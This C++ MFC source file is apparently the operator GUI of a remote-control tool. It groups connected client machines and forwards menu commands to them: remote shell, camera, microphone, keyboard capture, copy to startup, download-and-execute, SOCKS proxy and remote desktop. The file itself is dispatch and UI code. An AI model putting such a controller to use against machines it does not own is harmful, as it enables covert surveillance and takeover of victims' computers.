#include "stdafx.h"
#include "ClientView.h"
#include "ClientGroup.h"
#include "resource.h"
#include "GetStrDlg.h"
#include "MainFrm.h"

IMPLEMENT_DYNCREATE(CClientView, CView);

CClientView::CClientView()
{
	m_DefaultGroup = NULL;
	m_ClientCount = 0;
}


CClientView::~CClientView()
{

}


void CClientView::OnDraw(CDC* /*pDC*/)
{
	// TODO:  在此添加专用代码和/或调用基类
}
BEGIN_MESSAGE_MAP(CClientView, CView)
	ON_WM_CREATE()
	ON_WM_SIZE()

	//
	ON_MESSAGE(WM_KERNEL_LOGIN, OnClientLogin)
	ON_MESSAGE(WM_KERNEL_LOGOUT, OnClientLogout)
	ON_MESSAGE(WM_KERNEL_EDITCOMMENT, OnEditComment)
	ON_MESSAGE(WM_KERNEL_EDITGROUP,OnEditGroup)
	ON_MESSAGE(WM_KERNEL_GET_MODULE_PATH, OnGetModulePath)
	ON_MESSAGE(WM_KERNEL_ERROR, OnKernelError)
	ON_MESSAGE(WM_KERNEL_UPDATE_UPLODA_STATU, OnUpdateUploadStatu)

	//不在MainFrame里面加始终是灰色的.
	ON_COMMAND(ID_SESSION_DISCONNECT, &CClientView::OnSessionDisconnect)
	ON_COMMAND(ID_SESSION_UNINSTALL, &CClientView::OnSessionUninstall)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CClientView::OnPowerShutdown)
	ON_COMMAND(ID_POWER_REBOOT, &CClientView::OnPowerReboot)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CClientView::OnOperationEditcomment)
	ON_COMMAND(ID_OPERATION_CMD, &CClientView::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CClientView::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CClientView::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_CAMERA, &CClientView::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CClientView::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CClientView::OnOperationMicrophone)

	ON_COMMAND(ID_OPERATION_KEYBOARD, &CClientView::OnOperationKeyboard)
	ON_COMMAND(ID_UTILS_ADDTO, &CClientView::OnUtilsAddto)
	ON_COMMAND(ID_UTILS_COPYTOSTARTUP, &CClientView::OnUtilsCopytostartup)
	ON_COMMAND(ID_UTILS_DOWNLOADANDEXEC, &CClientView::OnUtilsDownloadandexec)
	ON_COMMAND(ID_PROXY_SOCKSPROXY, &CClientView::OnProxySocksproxy)
	ON_COMMAND(ID_SESSION_EXIT, &CClientView::OnSessionExit)
	ON_COMMAND(ID_UTILS_OPENWEBPAGE, &CClientView::OnUtilsOpenwebpage)
	ON_COMMAND(ID_OPERATION_PROCESSMANAGER, &CClientView::OnOperationProcessmanager)
	ON_COMMAND(ID_REMOTEDESKTOP_DXGI, &CClientView::OnRemotedesktopDxgi)
	ON_COMMAND(ID_REMOTEDESKTOP_GDI, &CClientView::OnRemotedesktopGdi)
	ON_WM_CONTEXTMENU()
	ON_COMMAND(ID_MAIN_REMOVECURRENTGROUP, &CClientView::OnMainRemovecurrentgroup)
	ON_COMMAND(ID_MAIN_ADDGROUP, &CClientView::OnMainAddgroup)
	ON_COMMAND(ID_OPERATION_MODIFYGROUP, &CClientView::OnOperationModifygroup)
	ON_WM_DESTROY()
END_MESSAGE_MAP()


CClientGroup* CClientView::CreateGroup(CONST TCHAR * GroupName)
{
	//return failed if it is existed.
	CClientGroup * clientGroup = NULL;
	LPVOID lpFindResult = NULL;
	TCHAR Name[0x40];

	CRect rectDummy;
	rectDummy.SetRectEmpty();
	
	if (m_ClientGroups.Lookup(GroupName, lpFindResult))
	{
		return NULL;
	}

	clientGroup = new CClientGroup(GroupName);

	if (!clientGroup->Create(
		WS_CHILD | WS_VISIBLE | LVS_REPORT,
		rectDummy,
		&m_tabGroups,
		NULL))
	{
		TRACE0("未能创建ClientList\n");
		delete clientGroup;
		return NULL;      // 未能创建
	}

	m_ClientGroups.SetAt(GroupName, clientGroup);

	wsprintf(Name, TEXT("%s (%d)"), GroupName, 0);
	m_tabGroups.AddTab(clientGroup, Name);
	return clientGroup;
}


void CClientView::OnDestroy()
{
	CView::OnDestroy();

	// TODO:  在此处添加消息处理程序代码
	Json::Value name;
	Json::Value groups;

	POSITION pos = m_ClientGroups.GetStartPosition();
	while (pos){
		CString key;
		LPVOID  value;
		m_ClientGroups.GetNextAssoc(pos, key, value);

		if (value != m_DefaultGroup)
		{
			name = CStringA(key).GetBuffer();
			groups.append(name);
		}
	}

	((CMainFrame*)GetParent())->Config().cfg()["groups"] = groups;
}


int CClientView::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;

	// TODO:  在此添加您专用的创建代码
	CRect rectDummy;
	LPVOID DefaultGroup = NULL;
	Json::Value groups;

	rectDummy.SetRectEmpty();

	m_tabGroups.Create(CMFCTabCtrl::Style::STYLE_3D_ROUNDED, rectDummy, this, 1);

	//create default group;
	if (!CreateGroup(TEXT("default")))
	{
		MessageBox(TEXT("Add default group failed!"), TEXT("ERROR"), MB_OK | MB_ICONERROR);
		return -1;
	}

	m_ClientGroups.Lookup(TEXT("default"), DefaultGroup);
	m_DefaultGroup = (CClientGroup*)DefaultGroup;

	//Create groups..

	Json::Value cfg = ((CMainFrame*)GetParent())->Config().cfg();
	groups = cfg["groups"];

	for (int i = 0; i < groups.size(); i++)
	{
		CString GroupName = CString(groups[i].asCString());
		//create default group;
		if (!CreateGroup(GroupName))
		{
			MessageBox(TEXT("Add default group failed!"), TEXT("ERROR"), MB_OK | MB_ICONERROR);
			return -1;
		}
	}
	return 0;
}


void CClientView::OnSize(UINT nType, int cx, int cy)
{
	CView::OnSize(nType, cx, cy);

	CRect rect;
	GetClientRect(rect);
	m_tabGroups.MoveWindow(rect);
	m_tabGroups.RedrawWindow();
}


BOOL CClientView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO:  在此添加专用代码和/或调用基类
	cs.style &= (~WS_BORDER);

	return CView::PreCreateWindow(cs);
}

void CClientView::OnContextMenu(CWnd* /*pWnd*/, CPoint pt)
{
	//group manager .
	CMenu menu;
	menu.LoadMenuW(IDR_GROUP_MANAGER);
	menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTALIGN, pt.x, pt.y, AfxGetMainWnd());
}

/*
	什么时候更新分组???

	1. 增加分组的时候
	2. 删除分组的时候
	3. 修改一个kernel分组的时候.


	什么时候更新状态栏??

	client login
	client logout.
*/

void CClientView::OnMainRemovecurrentgroup()
{
	CClientGroup * clientGroup = (CClientGroup*)m_tabGroups.GetActiveWnd();
	CString Tips;
	int n = 0, i = 0;

	if (m_DefaultGroup == clientGroup)
	{
		return;
	}

	Tips.Format(
		TEXT("Are you sure to remove [%s] group?"),
		clientGroup->GetGroupName());


	if (IDYES != MessageBox(Tips, TEXT("Tips"), MB_YESNO | MB_ICONQUESTION))
	{
		return;
	}

	//remove from current client Group,and add to default group.
	
	clientGroup->SetRedraw(FALSE);
	m_DefaultGroup->SetRedraw(FALSE);

	n = clientGroup->GetItemCount();

	for (i = 0; i < n; i++)
	{
		//add to default group.
		CKernelSrv * kernel = (CKernelSrv*)clientGroup->GetItemData(i);
		m_DefaultGroup->OnClientLogin(kernel);
	}

	n = m_tabGroups.GetTabsNum();

	for (i = 0; i < n; i++)
	{
		CClientGroup * group = (CClientGroup*)m_tabGroups.GetTabWnd(i);
		if (group == clientGroup)
		{
			m_tabGroups.RemoveTab(i);
			break;
		}
	}
	
	//remove from map.
	ASSERT(m_ClientGroups.RemoveKey(clientGroup->GetGroupName()));

	//delete current group .
	clientGroup->DestroyWindow();
	delete clientGroup;
	
	m_DefaultGroup->SetRedraw();

	for (i = 0; i < n; i++)
	{
		if (m_tabGroups.GetTabWnd(i) == m_DefaultGroup)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), m_DefaultGroup->GetGroupName(), m_DefaultGroup->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			break;
		}
	}

}


void CClientView::OnMainAddgroup()
{
	CGetStrDlg dlg(TEXT("New Group"));
	CString GroupName;
	CClientGroup * newGroup = NULL;
	int     i = 0,n = 0,find;

	if (IDOK != dlg.DoModal())
	{
		return;
	}

	GroupName = dlg.m_str;
	if (!(newGroup = CreateGroup(GroupName)))
	{
		CString err;
		err.Format(TEXT("Add [%s] group failed!"), GroupName);

		MessageBox(err, TEXT("Error"), MB_OK | MB_ICONERROR);
		return;
	}

	//remove client from default to new group if exist eligible client.
	n = m_DefaultGroup->GetItemCount();
	m_DefaultGroup->SetRedraw(FALSE);
	newGroup->SetRedraw(FALSE);

	for (; i < n;)
	{
		CKernelSrv* kernel = (CKernelSrv*)m_DefaultGroup->GetItemData(i);
		if (!lstrcmp(kernel->GetLoginInfo()->szGroup, GroupName))
		{
			//add to new group.
			newGroup->OnClientLogin(kernel);
			
			//remove from default group. 
			m_DefaultGroup->DeleteItem(i);
			n = m_DefaultGroup->GetItemCount();
		}
		else
		{
			i++;
		}
	}

	m_DefaultGroup->SetRedraw(TRUE);
	newGroup->SetRedraw(TRUE);

	n = m_tabGroups.GetTabsNum();

	find = 2;

	for (i = 0; i < n && find; i++)
	{
		if (m_tabGroups.GetTabWnd(i) == newGroup)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), newGroup->GetGroupName(), newGroup->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			--find;
		}
		else if (m_tabGroups.GetTabWnd(i) == m_DefaultGroup)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), m_DefaultGroup->GetGroupName(), m_DefaultGroup->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			--find;
		}
	}
}


//kernel notify message
LRESULT CClientView::OnKernelError(WPARAM error, LPARAM lParam)
{
	CHAR szIP[64];
	CString Title;
	CKernelSrv* kernel = (CKernelSrv*)lParam;
	kernel->GetPeerAddress(szIP);

	Title.Format(TEXT("[%s]"), CString(szIP));

	MessageBox((TCHAR*)error, Title, MB_ICONERROR | MB_OK);
	return 0;
}

LRESULT CClientView::OnGetModulePath(WPARAM wParam, LPARAM lParam)
{
	TCHAR *		 Path = (TCHAR*)lParam;
	CMainFrame * pMainFrame = (CMainFrame*)AfxGetMainWnd();
	CString ModulePath = CString(pMainFrame->Config().cfg()["server"]["modules"].asCString());

	lstrcpy(Path, ModulePath);
	return 0;
}

CClientGroup * CClientView::FindGroupByName(CONST TCHAR* szGroupName)
{
	CClientGroup * group = m_DefaultGroup;
	LPVOID     FindResult;

	if (lstrcmp(szGroupName, TEXT("default")))
	{
		if (!m_ClientGroups.Lookup(szGroupName, FindResult))
		{
			group = m_DefaultGroup;
		}
		else
		{
			ASSERT(FindResult);
			group = (CClientGroup*)FindResult;
		}
	}
	return group;
}


CClientGroup * CClientView::FindGroupByKernel(CKernelSrv * kernel)
{
	TCHAR *    szGroupName = kernel->GetLoginInfo()->szGroup;
	return FindGroupByName(szGroupName);
}

LRESULT CClientView::OnClientLogin(WPARAM wParam, LPARAM lParam)
{
	CKernelSrv* kernel = (CKernelSrv*)wParam;
	CClientGroup * group = FindGroupByKernel(kernel);
	int n = m_tabGroups.GetTabsNum();

	
	//add to client group list.
	group->OnClientLogin(kernel);

	//update tab name
	for (int i = 0; i < n; i++)
	{
		if (m_tabGroups.GetTabWnd(i) == group)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), group->GetGroupName(), group->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			break;
		}
	}


	m_ClientCount++;
	//Update statu bar.
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	CString msg;

	msg.Format(TEXT("Client login from [ %s ]."), kernel->GetPublicIP());
	pMainFrame->GetLogCtrl()->Log(msg);
	
	CString host;
	host.Format(TEXT("Host: %d"), m_ClientCount);
	pMainFrame->GetStatusBar()->SetPaneText(1, host);

	return 0;
}

LRESULT CClientView::OnClientLogout(WPARAM wParam, LPARAM lParam)
{
	CKernelSrv* kernel = (CKernelSrv*)wParam;
	CClientGroup * group = FindGroupByKernel(kernel);
	int n = m_tabGroups.GetTabsNum();

	group->OnClientLogout(kernel);

	//update tab name
	for (int i = 0; i < n; i++)
	{
		if (m_tabGroups.GetTabWnd(i) == group)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), group->GetGroupName(), group->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			break;
		}
	}
	
	//Update statu bar.
	m_ClientCount--;

	//Update statu bar.
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	CString msg;

	msg.Format(TEXT("Client from [ %s ] logout."), kernel->GetPublicIP());
	pMainFrame->GetLogCtrl()->Log(msg);

	kernel->Close();
	kernel->Put();

	CString host;
	host.Format(TEXT("Host: %d"), m_ClientCount);

	pMainFrame->GetStatusBar()->SetPaneText(1, host);
	return 0;
}

LRESULT CClientView::OnEditComment(WPARAM wParam, LPARAM lParam)
{
	CKernelSrv* kernel = (CKernelSrv*)wParam;
	FindGroupByKernel(kernel)->OnUpdateComment(kernel, (TCHAR*)lParam);
	return 0;
}

LRESULT CClientView::OnEditGroup(WPARAM wParam, LPARAM lParam)
{
	CKernelSrv* kernel   = (CKernelSrv*)wParam;
	CClientGroup * new_group;
	CClientGroup * old_group; 
	int n, i, find;

	if (!lstrcmp(kernel->GetLoginInfo()->szGroup, (TCHAR*)lParam))
		return 0;

	old_group = FindGroupByKernel(kernel);
	old_group->OnClientLogout(kernel);

	new_group = FindGroupByName((TCHAR*)lParam);
	new_group->OnClientLogin(kernel);

	n = m_tabGroups.GetTabsNum();

	find = 2;

	for (i = 0; i < n && find; i++)
	{
		if (m_tabGroups.GetTabWnd(i) == old_group)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), old_group->GetGroupName(), old_group->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			--find;
		}
		else if (m_tabGroups.GetTabWnd(i) == new_group)
		{
			CString name;
			name.Format(TEXT("%s (%d)"), new_group->GetGroupName(), new_group->GetItemCount());
			m_tabGroups.SetTabLabel(i, name);
			--find;
		}
	}

	return 0;
}

LRESULT CClientView::OnUpdateUploadStatu(WPARAM wParam, LPARAM lParam)
{
	CKernelSrv* kernel = (CKernelSrv*)wParam;
	FindGroupByKernel(kernel)->OnUpdateUploadStatus(kernel, (LPVOID*)lParam);
	return 0;
}

/******************************************************************/


void CClientView::OnSessionDisconnect()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_SESSION_DISCONNECT);
}
void CClientView::OnSessionUninstall()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_SESSION_UNINSTALL);
}
void CClientView::OnPowerShutdown()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_POWER_SHUTDOWN);
}
void CClientView::OnPowerReboot()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_POWER_REBOOT);
}
void CClientView::OnOperationEditcomment()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_EDITCOMMENT);
}
void CClientView::OnOperationCmd()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_CMD);
}
void CClientView::OnOperationChatbox()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_CHATBOX);
}
void CClientView::OnOperationFilemanager()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_FILEMANAGER);
}
void CClientView::OnOperationCamera()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_CAMERA);
}
void CClientView::OnSessionRestart()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_SESSION_RESTART);
}
void CClientView::OnOperationMicrophone()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_MICROPHONE);
}
void CClientView::OnOperationKeyboard()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_KEYBOARD);
}
void CClientView::OnUtilsAddto()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_UTILS_ADDTO);
}
void CClientView::OnUtilsCopytostartup()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_UTILS_COPYTOSTARTUP);
}


void CClientView::OnUtilsDownloadandexec()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_UTILS_DOWNLOADANDEXEC);
}
void CClientView::OnProxySocksproxy()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_PROXY_SOCKSPROXY);
}
void CClientView::OnSessionExit()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_SESSION_EXIT);
}
void CClientView::OnUtilsOpenwebpage()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_UTILS_OPENWEBPAGE);
}
void CClientView::OnOperationProcessmanager()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_PROCESSMANAGER);
}

void CClientView::OnRemotedesktopDxgi()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_REMOTEDESKTOP_DXGI);
}

void CClientView::OnRemotedesktopGdi()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_REMOTEDESKTOP_GDI);
}
void CClientView::OnOperationModifygroup()
{
	m_tabGroups.GetActiveWnd()->SendMessage(WM_COMMAND, ID_OPERATION_MODIFYGROUP);
}


